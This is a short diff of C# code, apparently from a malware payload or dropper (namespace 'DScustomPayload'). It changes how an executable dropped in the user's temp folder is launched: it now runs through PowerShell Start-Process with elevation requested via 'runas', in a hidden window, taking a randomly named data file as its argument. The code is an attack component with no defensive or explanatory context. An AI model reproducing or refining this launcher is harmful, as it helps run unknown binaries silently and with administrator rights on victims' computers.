@@ -364,10 +364,10 @@ namespace DScustomPayload
 			
 			ProcessStartInfo processInfo;
 			Process process;
-			processInfo = new ProcessStartInfo("cmd.exe", @"/c call %temp%\dang.exe %temp%\ptrgzksfeqfesgse.dang");
+			processInfo = new ProcessStartInfo("powershell.exe", @"Start-Process -Verb runas -FilePath '%temp%\dang.exe' -ArgumentList '%temp%\ptrgzksfeqfesgse.dang'");
 			processInfo.CreateNoWindow = true;
 			processInfo.UseShellExecute = false;
-			processInfo.Verb = "runas";
+			//processInfo.Verb = "runas";
 			processInfo.RedirectStandardOutput = true;
 			process = Process.Start(processInfo);
 			process.WaitForExit();
